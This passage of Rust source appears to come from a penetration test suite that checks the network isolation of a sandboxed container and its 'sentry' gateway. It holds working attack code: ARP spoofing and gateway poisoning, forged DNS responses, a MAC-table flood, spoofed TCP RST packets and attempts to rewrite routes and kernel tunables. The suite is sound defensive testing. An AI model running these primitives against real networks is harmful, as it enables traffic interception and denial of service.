        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let frame = build_gratuitous_arp(&our_mac_bytes, &sentry_ip);
    if send_raw_frame(&iface, &frame) {
        pass(format!(
            "SENT gratuitous ARP claiming {} at {} on {}",
            sentry_ip, our_mac, iface
        ))
    } else {
        fail("AF_PACKET open but frame send failed".to_string())
    }
}

// ── Novel unilateral attacks ─────────────────────────────────

/// Route table manipulation — attempt ip route replace/add to bypass sentry gateway.
/// Verifies container lacks CAP_NET_ADMIN to modify routing table.
pub fn sortie_net_route_manipulation(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let mut diagnostics = Vec::new();

    // Attempt 1: Replace default route to bypass sentry
    let replace_result = Command::new("ip")
        .args(["route", "replace", "default", "via", "127.0.0.1"])
        .output();
    match &replace_result {
        Ok(output) => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            if output.status.success() {
                return fail(format!(
                    "BREACH: ip route replace default succeeded — routing table writable, sentry bypass possible"
                ));
            }
            diagnostics.push(format!(
                "ip route replace default: blocked (exit {}, {})",
                output.status.code().unwrap_or(-1),
                stderr.trim()
            ));
        }
        Err(e) => {
            diagnostics.push(format!("ip route replace default: exec failed ({})", e));
        }
    }

    // Attempt 2: Add a route to an external network bypassing sentry
    let add_result = Command::new("ip")
        .args(["route", "add", "192.168.99.0/24", "via", &sentry_ip])
        .output();
    match &add_result {
        Ok(output) => {
            let stderr = String::from_utf8_lossy(&output.stderr);
            if output.status.success() {
                // Clean up if it somehow succeeded
                let _ = Command::new("ip")
                    .args(["route", "del", "192.168.99.0/24"])
                    .output();
                return fail(format!(
                    "BREACH: ip route add succeeded — container can inject arbitrary routes"
                ));
            }
            diagnostics.push(format!(
                "ip route add 192.168.99.0/24: blocked (exit {}, {})",
                output.status.code().unwrap_or(-1),
                stderr.trim()
            ));
        }
        Err(e) => {
            diagnostics.push(format!("ip route add: exec failed ({})", e));
        }
    }

    // Attempt 3: Delete existing default route
    let del_result = Command::new("ip")
        .args(["route", "del", "default"])
        .output();
    match &del_result {
        Ok(output) => {
            if output.status.success() {
                return fail(format!(
                    "BREACH: ip route del default succeeded — container can remove its own routes"
                ));
            }
            let stderr = String::from_utf8_lossy(&output.stderr);
            diagnostics.push(format!(
                "ip route del default: blocked (exit {}, {})",
                output.status.code().unwrap_or(-1),
                stderr.trim()
            ));
        }
        Err(e) => {
            diagnostics.push(format!("ip route del default: exec failed ({})", e));
        }
    }

    pass(format!(
        "SECURE: route table immutable — all modification attempts blocked. {}",
        diagnostics.join("; ")
    ))
}

/// Enclave subnet escape — probe hosts outside /24 enclave within bridge network range.
/// Distinct from net_forbidden_cidr which tests internet-routable destinations.
pub fn sortie_net_enclave_subnet_escape(_extra_args: &[&str]) -> rbida_Verdict {
    let base_ip = match env_require("RBRN_ENCLAVE_BASE_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let netmask: u32 = match env_require("RBRN_ENCLAVE_NETMASK") {
        Ok(v) => match v.parse() {
            Ok(n) => n,
            Err(_) => return fail(format!("ERROR: bad RBRN_ENCLAVE_NETMASK: {}", v)),
        },
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let octets: Vec<u8> = match base_ip
        .split('.')
        .map(|s| s.parse::<u8>())
        .collect::<Result<Vec<_>, _>>()
    {
        Ok(v) if v.len() == 4 => v,
        _ => return fail(format!("ERROR: bad RBRN_ENCLAVE_BASE_IP: {}", base_ip)),
    };
    let base_u32 =
        ((octets[0] as u32) << 24) | ((octets[1] as u32) << 16) | ((octets[2] as u32) << 8) | (octets[3] as u32);

    let timeout = Duration::from_millis(1500);
    let mut diagnostics = Vec::new();

    // Compute probe targets outside the enclave /24 (or whatever netmask) but
    // within plausible bridge network ranges
    let enclave_mask = if netmask >= 32 { !0u32 } else { !0u32 << (32 - netmask) };
    let enclave_net = base_u32 & enclave_mask;

    // Probe: next subnet up (.1 host in adjacent /24)
    let adjacent_up = (enclave_net | (1u32 << (32 - netmask))) | 1;
    // Probe: subnet below (wrap-safe)
    let adjacent_down = enclave_net.wrapping_sub(256) | 1;
    // Probe: far end of the /16 range
    let far_end = (base_u32 & 0xFFFF0000) | 0x0000FF01; // x.x.255.1

    let probe_targets = [
        (adjacent_up, "adjacent subnet +1"),
        (adjacent_down, "adjacent subnet -1"),
        (far_end, "far end of /16 range"),
    ];

    for (ip_u32, label) in &probe_targets {
        // Skip if target falls within enclave subnet
        if (*ip_u32 & enclave_mask) == enclave_net {
            diagnostics.push(format!("{}: skipped (within enclave)", label));
            continue;
        }
        let ip_str = format!(
            "{}.{}.{}.{}",
            (*ip_u32 >> 24) & 0xFF,
            (*ip_u32 >> 16) & 0xFF,
            (*ip_u32 >> 8) & 0xFF,
            *ip_u32 & 0xFF
        );
        // TCP probe on common ports
        for &port in &[80u16, 443, 53] {
            let (connected, refused, _) = tcp_probe(&ip_str, port, timeout);
            if connected || refused {
                return fail(format!(
                    "BREACH: TCP {}:{} ({}) — {} (packet escaped enclave subnet)",
                    ip_str,
                    port,
                    label,
                    if connected { "CONNECTED" } else { "REFUSED" }
                ));
            }
        }
        diagnostics.push(format!("{} ({}): unreachable", label, ip_str));
    }

    pass(format!(
        "SECURE: enclave subnet isolation enforced — no response from outside /{}. {}",
        netmask,
        diagnostics.join("; ")
    ))
}

/// DNAT entry port reflection — focused test of sentry DNAT asymmetry.
/// The sentry DNATs the entry port for external (transit) access to the bottle.
/// From inside the enclave, the entry port should be unreachable on the sentry.
pub fn sortie_net_dnat_entry_reflection(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let ws_port: u16 = match env_require("RBRN_ENTRY_PORT_WORKSTATION") {
        Ok(v) => match v.parse() {
            Ok(p) => p,
            Err(_) => return fail(format!("ERROR: bad RBRN_ENTRY_PORT_WORKSTATION: {}", v)),
        },
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let enc_port: u16 = match env_require("RBRN_ENTRY_PORT_ENCLAVE") {
        Ok(v) => match v.parse() {
            Ok(p) => p,
            Err(_) => return fail(format!("ERROR: bad RBRN_ENTRY_PORT_ENCLAVE: {}", v)),
        },
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let timeout = Duration::from_secs(2);
    let mut diagnostics = Vec::new();

    // Test 1: Workstation-facing entry port on sentry (the DNAT target)
    let (ws_connected, ws_refused, ws_err) = tcp_probe(&sentry_ip, ws_port, timeout);
    if ws_connected {
        return fail(format!(
            "BREACH: sentry {}:{} (workstation entry port) — CONNECTED from enclave. \
             DNAT rule is accepting enclave-originated connections",
            sentry_ip, ws_port
        ));
    }
    diagnostics.push(format!(
        "workstation port {}:{}: {} ({})",
        sentry_ip,
        ws_port,
        if ws_refused { "refused" } else { "timeout" },
        ws_err.as_deref().unwrap_or("clean timeout")
    ));

    // Test 2: Enclave-side entry port on sentry
    if enc_port != ws_port {
        let (enc_connected, enc_refused, enc_err) = tcp_probe(&sentry_ip, enc_port, timeout);
        if enc_connected {
            return fail(format!(
                "BREACH: sentry {}:{} (enclave entry port) — CONNECTED from enclave. \
                 Enclave-side entry port exposed on sentry",
                sentry_ip, enc_port
            ));
        }
        diagnostics.push(format!(
            "enclave port {}:{}: {} ({})",
            sentry_ip,
            enc_port,
            if enc_refused { "refused" } else { "timeout" },
            enc_err.as_deref().unwrap_or("clean timeout")
        ));
    }

    // Test 3: Verify the bottle's own enclave IP doesn't expose the entry port
    // (DNAT should not reflect back to the bottle itself)
    if let Ok(bottle_ip) = env_require("RBRN_ENCLAVE_BOTTLE_IP") {
        let (bottle_connected, bottle_refused, bottle_err) = tcp_probe(&bottle_ip, enc_port, timeout);
        // Connected is expected if a service is listening — that's the bottle's own port.
        // Refused is normal (no listener). Only flag if the port shows behavior inconsistent
        // with what the bottle itself runs.
        diagnostics.push(format!(
            "bottle self {}:{}: {}",
            bottle_ip,
            enc_port,
            if bottle_connected {
                "listening (expected — bottle service port)"
            } else if bottle_refused {
                "refused (no listener)"
            } else {
                bottle_err.as_deref().unwrap_or("timeout")
            }
        ));
    }

    pass(format!(
        "SECURE: DNAT entry ports unreachable from enclave — asymmetry enforced. {}",
        diagnostics.join("; ")
    ))
}

pub fn sortie_arp_send_gateway_poison(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let (iface, our_mac) = match get_interface_info() {
        Some((i, m)) => (i, m),
        None => return fail("ERROR: cannot discover enclave interface".to_string()),
    };

    if arp_test_af_packet(&iface).is_err() {
        return fail("AF_PACKET unavailable — cannot send L2 frames".to_string());
    }

    let our_mac_bytes = match mac_to_bytes(&our_mac) {
        Ok(b) => b,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // Discover sentry MAC so we can send targeted ARP reply
    let sentry_mac = match get_sentry_mac(&sentry_ip) {
        Some(m) => m,
        None => return fail("cannot discover sentry MAC from ARP cache".to_string()),
    };
    let sentry_mac_bytes = match mac_to_bytes(&sentry_mac) {
        Ok(b) => b,
        Err(e) => return fail(format!("ERROR: sentry MAC parse: {}", e)),
    };

    // Compute gateway IP as .1 on the sentry's subnet
    let prefix: String = sentry_ip
        .rsplit('.')
        .skip(1)
        .collect::<Vec<_>>()
        .into_iter()
        .rev()
        .collect::<Vec<_>>()
        .join(".");
    let fake_gw = format!("{}.1", prefix);

    // Send targeted ARP reply: tell sentry that gateway is at our MAC
    let frame = build_arp_reply(&our_mac_bytes, &fake_gw, &sentry_mac_bytes, &sentry_ip);
    if send_raw_frame(&iface, &frame) {
        pass(format!(
            "SENT ARP reply to sentry ({}) claiming {} at {}",
            sentry_ip, fake_gw, our_mac
        ))
    } else {
        fail("AF_PACKET open but targeted ARP frame send failed".to_string())
    }
}

// ── Coordinated integrity primitives ─────────────────────────

/// Send forged DNS UDP responses to sentry's dnsmasq port claiming google.com → 1.2.3.4.
/// Coordinated primitive: passed=true means "forged responses were sent" (theurge judges DNS state).
pub fn sortie_dns_forge_response(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    // Build a DNS response claiming google.com → 1.2.3.4
    let build_dns_response = |txn_id: u16| -> Vec<u8> {
        let mut pkt = Vec::with_capacity(64);
        // Header (12 bytes)
        pkt.extend_from_slice(&txn_id.to_be_bytes()); // Transaction ID
        pkt.extend_from_slice(&0x8580u16.to_be_bytes()); // Flags: QR=1 AA=1 RD=1 RA=1
        pkt.extend_from_slice(&1u16.to_be_bytes()); // QDCOUNT
        pkt.extend_from_slice(&1u16.to_be_bytes()); // ANCOUNT
        pkt.extend_from_slice(&0u16.to_be_bytes()); // NSCOUNT
        pkt.extend_from_slice(&0u16.to_be_bytes()); // ARCOUNT
        // Question: google.com A IN
        pkt.extend_from_slice(b"\x06google\x03com\x00");
        pkt.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
        pkt.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
        // Answer: pointer to name at offset 12, A record 1.2.3.4
        pkt.extend_from_slice(&0xC00Cu16.to_be_bytes()); // Name pointer
        pkt.extend_from_slice(&1u16.to_be_bytes()); // TYPE A
        pkt.extend_from_slice(&1u16.to_be_bytes()); // CLASS IN
        pkt.extend_from_slice(&3600u32.to_be_bytes()); // TTL
        pkt.extend_from_slice(&4u16.to_be_bytes()); // RDLENGTH
        pkt.extend_from_slice(&[1, 2, 3, 4]); // RDATA: 1.2.3.4
        pkt
    };

    let target = format!("{}:53", sentry_ip);
    let sock = match UdpSocket::bind("0.0.0.0:0") {
        Ok(s) => s,
        Err(e) => return fail(format!("cannot bind UDP socket: {}", e)),
    };
    let _ = sock.set_write_timeout(Some(Duration::from_secs(2)));

    let mut sent = 0u32;
    // Send multiple forged responses with varying transaction IDs
    for txn_id in 1000u16..1050 {
        let pkt = build_dns_response(txn_id);
        if sock.send_to(&pkt, &target).is_ok() {
            sent += 1;
        }
    }

    if sent > 0 {
        pass(format!(
            "SENT {} forged DNS responses to {}:53 claiming google.com→1.2.3.4",
            sent, sentry_ip
        ))
    } else {
        fail(format!(
            "failed to send any forged DNS packets to {}",
            target
        ))
    }
}

/// Flood the bridge's MAC learning table with frames from random source MACs.
/// Coordinated primitive: passed=true means "flood was executed" (theurge judges connectivity).
pub fn sortie_mac_flood_bridge(_extra_args: &[&str]) -> rbida_Verdict {
    let (iface, _our_mac) = match get_interface_info() {
        Some((i, m)) => (i, m),
        None => return fail("ERROR: cannot discover enclave interface".to_string()),
    };

    if arp_test_af_packet(&iface).is_err() {
        return fail("AF_PACKET unavailable — cannot send L2 frames".to_string());
    }

    let broadcast = [0xFFu8; 6];
    let mut sent = 0u32;
    let mut rng_buf = [0u8; 6];

    for i in 0u32..200 {
        // Generate a random unicast MAC
        if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
            if IoRead::read_exact(&mut f, &mut rng_buf).is_err() {
                // Fallback: deterministic but varied MACs
                rng_buf = [
                    0x02,
                    ((i >> 24) & 0xFF) as u8,
                    ((i >> 16) & 0xFF) as u8,
                    ((i >> 8) & 0xFF) as u8,
                    (i & 0xFF) as u8,
                    0x01,
                ];
            }
        } else {
            rng_buf = [
                0x02,
                ((i >> 24) & 0xFF) as u8,
                ((i >> 16) & 0xFF) as u8,
                ((i >> 8) & 0xFF) as u8,
                (i & 0xFF) as u8,
                0x01,
            ];
        }
        // Set locally-administered + unicast bits
        rng_buf[0] = (rng_buf[0] & 0xFE) | 0x02;

        let mut frame = Vec::with_capacity(60);
        frame.extend_from_slice(&broadcast); // dst: broadcast
        frame.extend_from_slice(&rng_buf); // src: random MAC
        frame.extend_from_slice(&[0x88, 0xB5]); // ethertype: Local Experimental
        frame.resize(60, 0); // pad to minimum Ethernet frame size

        if send_raw_frame(&iface, &frame) {
            sent += 1;
        }
    }

    if sent > 0 {
        pass(format!(
            "SENT {} frames with random source MACs on {}",
            sent, iface
        ))
    } else {
        fail("AF_PACKET open but no frames could be sent".to_string())
    }
}

// ── Advanced adversarial probe: dns_rebinding ────────────────

pub fn sortie_dns_rebinding(_extra_args: &[&str]) -> rbida_Verdict {
    let domains_str = match env_require("RBRN_UPLINK_ALLOWED_DOMAINS") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let domain = match domains_str.split_whitespace().next() {
        Some(d) => d,
        None => return fail("ERROR: RBRN_UPLINK_ALLOWED_DOMAINS is empty".to_string()),
    };

    // Resolve domain multiple times with short delays to probe cache consistency
    let mut ips: Vec<String> = Vec::new();
    for i in 0..5 {
        match dig_resolve(domain) {
            Some(ip) => ips.push(ip),
            None => return fail(format!(
                "ERROR: cannot resolve {} on iteration {} — DNS down",
                domain, i
            )),
        }
        if i < 4 {
            std::thread::sleep(Duration::from_millis(200));
        }
    }

    // All resolutions should return the same IP (dnsmasq serves frozen local records)
    let first = &ips[0];
    for (i, ip) in ips.iter().enumerate().skip(1) {
        if ip != first {
            return fail(format!(
                "BREACH: {} resolution changed between iterations: {} → {} (iter {}) — cache manipulation possible",
                domain, first, ip, i
            ));
        }
    }

    // Probe different record types — AAAA and MX should either resolve consistently or return empty
    let aaaa_results: Vec<Option<String>> = (0..3).map(|_| {
        let output = Command::new("dig")
            .args(["+short", "AAAA", domain])
            .output()
            .ok();
        output.and_then(|o| {
            let stdout = String::from_utf8_lossy(&o.stdout);
            stdout.lines()
                .find(|l| !l.trim().is_empty())
                .map(|l| l.trim().to_string())
        })
    }).collect();

    // Check AAAA consistency (all should be the same — either all Some(same) or all None)
    if aaaa_results.len() >= 2 {
        let first_aaaa = &aaaa_results[0];
        for (i, result) in aaaa_results.iter().enumerate().skip(1) {
            if result != first_aaaa {
                return fail(format!(
                    "BREACH: AAAA record for {} inconsistent: {:?} → {:?} (iter {})",
                    domain, first_aaaa, result, i
                ));
            }
        }
    }

    // MX record probe
    let mx_results: Vec<Option<String>> = (0..2).map(|_| {
        let output = Command::new("dig")
            .args(["+short", "MX", domain])
            .output()
            .ok();
        output.and_then(|o| {
            let stdout = String::from_utf8_lossy(&o.stdout);
            stdout.lines()
                .find(|l| !l.trim().is_empty())
                .map(|l| l.trim().to_string())
        })
    }).collect();

    if mx_results.len() >= 2 && mx_results[0] != mx_results[1] {
        return fail(format!(
            "BREACH: MX record for {} inconsistent: {:?} → {:?}",
            domain, mx_results[0], mx_results[1]
        ));
    }

    pass(format!(
        "SECURE: DNS rebinding check — {} resolved consistently to {} across {} queries, AAAA/MX stable",
        domain, first, ips.len()
    ))
}

// ── Advanced adversarial probe: proc_sys_write ───────────────

pub fn sortie_proc_sys_write(_extra_args: &[&str]) -> rbida_Verdict {
    let tunables: &[(&str, &str)] = &[
        ("/proc/sys/net/ipv4/ip_forward", "1"),
        ("/proc/sys/net/ipv4/conf/all/rp_filter", "0"),
        ("/proc/sys/net/ipv4/conf/eth0/rp_filter", "0"),
        ("/proc/sys/net/ipv6/conf/all/disable_ipv6", "0"),
        ("/proc/sys/net/ipv4/conf/all/forwarding", "1"),
        ("/proc/sys/net/ipv4/conf/all/accept_redirects", "1"),
        ("/proc/sys/net/ipv4/conf/all/send_redirects", "1"),
    ];

    for (path, value) in tunables {
        // Try writing via direct file write
        if let Ok(mut f) = std::fs::File::options().write(true).open(path) {
            if IoWrite::write_all(&mut f, value.as_bytes()).is_ok() {
                return fail(format!(
                    "BREACH: successfully wrote '{}' to {} — kernel network tunable modified",
                    value, path
                ));
            }
        }

        // Try writing via sysctl command
        // Convert /proc/sys/net/ipv4/ip_forward → net.ipv4.ip_forward
        let sysctl_key = path
            .strip_prefix("/proc/sys/")
            .unwrap_or(path)
            .replace('/', ".");
        if let Ok(output) = Command::new("sysctl")
            .args(["-w", &format!("{}={}", sysctl_key, value)])
            .output()
        {
            if output.status.success() {
                return fail(format!(
                    "BREACH: sysctl -w {}={} succeeded — kernel tunable modified via sysctl",
                    sysctl_key, value
                ));
            }
        }
    }

    // Also verify current values are read-only by attempting truncate-open
    for (path, _) in tunables {
        if std::fs::File::options()
            .write(true)
            .truncate(true)
            .open(path)
            .is_ok()
        {
            return fail(format!(
                "BREACH: truncate-open succeeded on {} — file is writable",
                path
            ));
        }
    }

    pass("SECURE: all /proc/sys kernel tunables are read-only from bottle".to_string())
}

// ── Advanced adversarial probe: tcp_rst_hijack ───────────────
//
// Coordinated primitive: forge TCP RST packets aimed at the sentry's
// DNS connection (port 53). Verdict semantics:
//   passed=true  → "I sent the RST packets" (theurge verifies DNS still works)
//   passed=false → "I could not send" (raw socket blocked, etc.)

pub fn sortie_tcp_rst_hijack(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let bottle_ip = match env_require("RBRN_ENCLAVE_BOTTLE_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };

    let timeout = Duration::from_secs(3);
    let mut sent = 0u32;

    // Forge TCP RST packets targeting sentry's DNS port (53) from various source ports
    // This attempts to disrupt the sentry's upstream DNS forwarding
    for src_port in [40000u16, 40001, 40002, 53, 1053, 5353] {
        // Build TCP RST segment
        let rst_seg = build_tcp_rst(src_port, 53);

        // Build IP header with bottle as source, sentry as destination
        let ip_hdr = match build_ip_header(6, &bottle_ip, &sentry_ip, rst_seg.len()) {
            Ok(h) => h,
            Err(_) => continue,
        };

        let mut packet = ip_hdr;
        packet.extend_from_slice(&rst_seg);

        match send_raw_ip_and_listen(&packet, &sentry_ip, timeout) {
            Ok(_) => sent += 1,
            Err(_) => {} // Raw socket may be blocked — that's fine
        }
    }

    // Also try RST to upstream DNS (8.8.8.8) as if spoofed from sentry
    for src_port in [53u16, 40000] {
        let rst_seg = build_tcp_rst(src_port, 53);
        let ip_hdr = match build_ip_header(6, &bottle_ip, "8.8.8.8", rst_seg.len()) {
            Ok(h) => h,
            Err(_) => continue,
        };

        let mut packet = ip_hdr;
        packet.extend_from_slice(&rst_seg);

        match send_raw_ip_and_listen(&packet, "8.8.8.8", timeout) {
            Ok(_) => sent += 1,
            Err(_) => {}
        }
    }

    if sent > 0 {
        pass(format!(
            "SENT {} TCP RST packets targeting DNS connections (sentry {}, upstream 8.8.8.8)",
            sent, sentry_ip
        ))
    } else {
        fail("could not send any TCP RST packets — raw sockets fully blocked".to_string())
    }
}

/// Build TCP ACK segment (20 bytes, no options) — no prior SYN.
fn build_tcp_ack(src_port: u16, dst_port: u16) -> Vec<u8> {
    let seq_bytes = random_hex(8);
    let seq = u32::from_str_radix(&seq_bytes, 16).unwrap_or(0x41414141);
    let ack_bytes = random_hex(8);
    let ack = u32::from_str_radix(&ack_bytes, 16).unwrap_or(0x42424242);
    let data_offset_flags: u16 = (5 << 12) | 0x010; // ACK flag
    let mut seg = Vec::with_capacity(20);
    seg.extend_from_slice(&src_port.to_be_bytes());
    seg.extend_from_slice(&dst_port.to_be_bytes());
    seg.extend_from_slice(&seq.to_be_bytes());
    seg.extend_from_slice(&ack.to_be_bytes());
    seg.extend_from_slice(&data_offset_flags.to_be_bytes());
    seg.extend_from_slice(&65535u16.to_be_bytes()); // window
    seg.extend_from_slice(&0u16.to_be_bytes()); // checksum
    seg.extend_from_slice(&0u16.to_be_bytes()); // urgent
    seg
}

/// Build TCP RST segment (20 bytes, no options).
fn build_tcp_rst(src_port: u16, dst_port: u16) -> Vec<u8> {
    let seq_bytes = random_hex(8);
    let seq = u32::from_str_radix(&seq_bytes, 16).unwrap_or(0x41414141);
    let data_offset_flags: u16 = (5 << 12) | 0x004; // RST flag
    let mut seg = Vec::with_capacity(20);
    seg.extend_from_slice(&src_port.to_be_bytes());
    seg.extend_from_slice(&dst_port.to_be_bytes());
    seg.extend_from_slice(&seq.to_be_bytes());
    seg.extend_from_slice(&0u32.to_be_bytes()); // ACK
    seg.extend_from_slice(&data_offset_flags.to_be_bytes());
    seg.extend_from_slice(&0u16.to_be_bytes()); // window
    seg.extend_from_slice(&0u16.to_be_bytes()); // checksum
    seg.extend_from_slice(&0u16.to_be_bytes()); // urgent
    seg
}

// ── Egress control verification: udp_non_dns_blocked ─────────

pub fn sortie_udp_non_dns_blocked(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(3);

    // 8.8.8.8 is outside allowed CIDRs — UDP on non-DNS port should be blocked
    let targets: &[(&str, u16)] = &[
        ("8.8.8.8", 1234),
        ("8.8.8.8", 4321),
        ("1.1.1.1", 1234),
    ];

    for (host, port) in targets {
        let addr: SocketAddr = match format!("{}:{}", host, port).parse() {
            Ok(a) => a,
            Err(e) => return fail(format!("ERROR: cannot parse {}:{} — {}", host, port, e)),
        };
        if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
            let _ = sock.set_read_timeout(Some(timeout));
            let _ = sock.send_to(b"PROBE", addr);
            let mut buf = [0u8; 64];
            if sock.recv_from(&mut buf).is_ok() {
                return fail(format!(
                    "BREACH: UDP {}:{} — response received (packet escaped enclave)",
                    host, port
                ));
            }
        }
    }

    pass("SECURE: UDP non-DNS to non-allowed IPs blocked — no responses".to_string())
}

// ── Egress control verification: cidr_all_ports_allowed ──────

pub fn sortie_cidr_all_ports_allowed(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(5);

    // Resolve connectivity domain — it's on the allowed CIDR list.
    // Use getent (same resolver as other ifrit attacks).
    let resolve_output = match std::process::Command::new("getent")
        .args(["hosts", RBIDA_CONNECTIVITY_DOMAIN])
        .output()
    {
        Ok(o) => o,
        Err(e) => return fail(format!("ERROR: getent failed: {}", e)),
    };
    if !resolve_output.status.success() {
        return fail(format!("ERROR: cannot resolve {} (DNS blocked?)", RBIDA_CONNECTIVITY_DOMAIN));
    }
    let stdout = String::from_utf8_lossy(&resolve_output.stdout);
    let ip = match stdout.split_whitespace().next() {
        Some(ip) => ip.to_string(),
        None => return fail("ERROR: getent returned empty output".to_string()),
    };

    // Test multiple ports — CIDR allowlist should permit all of them
    let ports: &[u16] = &[80, 443];
    for port in ports {
        let (connected, refused, err_msg) = tcp_probe(&ip, *port, timeout);
        if connected || refused {
            // Both connected and refused mean iptables allowed the packet through.
            // Connected = remote accepted; refused = remote sent RST. Either is fine.
            continue;
        }
        // Timeout = iptables DROP'd the packet
        return fail(format!(
            "BREACH: TCP {}:{} timed out — iptables blocked (CIDR should allow all ports). Error: {}",
            ip,
            port,
            err_msg.unwrap_or_default()
        ));
    }

    pass(format!(
        "SECURE: CIDR all-ports allowed — TCP to {} on ports {:?} all reached remote",
        ip, ports
    ))
}

// ── Network path verification: http_end_to_end ──────────────

pub fn sortie_http_end_to_end(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(10);

    // Resolve connectivity domain via getent to get IP (same as other ifrit attacks)
    let resolve_output = match Command::new("getent")
        .args(["hosts", RBIDA_CONNECTIVITY_DOMAIN])
        .output()
    {
        Ok(o) => o,
        Err(e) => return fail(format!("ERROR: getent failed: {}", e)),
    };
    if !resolve_output.status.success() {
        return fail(format!("ERROR: cannot resolve {} (DNS blocked?)", RBIDA_CONNECTIVITY_DOMAIN));
    }
    let stdout = String::from_utf8_lossy(&resolve_output.stdout);
    let ip = match stdout.split_whitespace().next() {
        Some(ip) => ip.to_string(),
        None => return fail("ERROR: getent returned empty output".to_string()),
    };

    // TCP connect to resolved IP on port 80
    let addr: SocketAddr = match format!("{}:80", ip).parse() {
        Ok(a) => a,
        Err(e) => return fail(format!("ERROR: cannot parse {}:80 — {}", ip, e)),
    };
    let mut stream = match TcpStream::connect_timeout(&addr, timeout) {
        Ok(s) => s,
        Err(e) => {
            return fail(format!(
                "BREACH: TCP connect to {}:80 failed — NAT masquerade not routing: {}",
                ip, e
            ))
        }
    };
    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));

    // Send HTTP/1.1 GET (User-Agent required by InterNIC's Apache)
    let request = format!("GET / HTTP/1.1\r\nHost: {}\r\nUser-Agent: rbid/1.0\r\nConnection: close\r\n\r\n", RBIDA_CONNECTIVITY_DOMAIN);
    if let Err(e) = IoWrite::write_all(&mut stream, request.as_bytes()) {
        return fail(format!("ERROR: write failed to {}:80 — {}", ip, e));
    }

    // Read full response
    let mut response = Vec::new();
    let _ = IoRead::read_to_end(&mut stream, &mut response);
    if response.is_empty() {
        return fail(format!(
            "BREACH: empty response from {}:80 — NAT masquerade not returning data",
            ip
        ));
    }

    let response_str = String::from_utf8_lossy(&response);

    // Verify HTTP 200 status
    let status_ok = response_str
        .lines()
        .next()
        .map_or(false, |line| line.contains("200"));
    if !status_ok {
        let first_line = response_str.lines().next().unwrap_or("<empty>");
        return fail(format!(
            "BREACH: HTTP response from {}:80 was not 200 — got: {}",
            ip, first_line
        ));
    }

    // Verify body contains expected marker from connectivity domain
    if !response_str.contains(RBIDA_HTTP_BODY_MARKER_INTERNIC) {
        return fail(format!(
            "BREACH: HTTP 200 from {}:80 but body missing '{}' — response truncated or wrong host (body length: {} bytes)",
            ip, RBIDA_HTTP_BODY_MARKER_INTERNIC, response.len()
        ));
    }

    pass(format!(
        "SECURE: HTTP GET to {} ({}) returned 200 with '{}' in body ({} bytes)",
        RBIDA_CONNECTIVITY_DOMAIN, ip, RBIDA_HTTP_BODY_MARKER_INTERNIC, response.len()
    ))
}

// ── Sentry self-protection: sentry_udp_non_dns ───────────────

pub fn sortie_sentry_udp_non_dns(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let timeout = Duration::from_secs(2);

    // Negative tests: UDP to sentry on non-53 ports should be blocked by INPUT DROP
    let probe_ports: &[u16] = &[123, 161, 1234, 5353, 8053, 10000];
    for &port in probe_ports {
        let addr: SocketAddr = match format!("{}:{}", sentry_ip, port).parse() {
            Ok(a) => a,
            Err(e) => return fail(format!("ERROR: cannot parse {}:{} — {}", sentry_ip, port, e)),
        };
        if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
            let _ = sock.set_read_timeout(Some(timeout));
            let _ = sock.send_to(b"PROBE", addr);
            let mut buf = [0u8; 64];
            if sock.recv_from(&mut buf).is_ok() {
                return fail(format!(
                    "BREACH: sentry UDP {}:{} — response received (INPUT DROP not blocking non-DNS UDP)",
                    sentry_ip, port
                ));
            }
        }
    }

    // Positive control: UDP 53 (DNS) to sentry should work
    let dig_output = Command::new("dig")
        .args(["+short", &format!("@{}", sentry_ip), RBIDA_CONNECTIVITY_DOMAIN])
        .output();
    match dig_output {
        Ok(o) if o.status.success() => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            if stdout.trim().is_empty() {
                return fail(format!(
                    "ERROR: dig @{} {} returned empty — DNS not working",
                    sentry_ip, RBIDA_CONNECTIVITY_DOMAIN
                ));
            }
        }
        Ok(o) => {
            return fail(format!(
                "ERROR: dig @{} {} failed (exit {}) — positive control broken",
                sentry_ip, RBIDA_CONNECTIVITY_DOMAIN, o.status.code().unwrap_or(-1)
            ));
        }
        Err(e) => {
            return fail(format!(
                "ERROR: dig command failed: {} — positive control broken",
                e
            ));
        }
    }

    pass(format!(
